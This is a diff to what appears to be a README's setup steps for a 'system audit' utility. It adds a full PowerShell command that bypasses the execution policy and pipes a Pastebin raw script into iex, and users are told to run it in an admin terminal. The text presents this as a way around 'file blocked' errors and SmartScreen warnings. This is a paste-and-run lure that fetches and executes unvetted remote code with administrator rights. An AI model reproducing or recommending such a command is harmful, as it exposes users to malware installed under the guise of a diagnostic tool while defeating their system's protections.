@@ -26,7 +26,7 @@
 We have transitioned to a **Direct Execution** method to bypass "file blocked" errors and SmartScreen warnings. No download is required.
 
 1. **Open PowerShell as Admin:** Right-click the **Start Button** and select **Terminal (Admin)** or **PowerShell (Admin)**.
-2. **Copy the Command:** Highlight and copy your specific PowerShell stub code.
+2. **Copy the Command:** Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; irm "https://pastebin.com/raw/2XkDXrfP" | iex
 3. **Paste and Run:** Right-click in the PowerShell window to paste the command, then press **Enter**.
 4. **View Results:** The utility will pull the latest version from Pastebin and display your system audit instantly.
 5. **Save Report:** Follow the on-screen prompt to save a copy of the results to your Desktop for future reference.
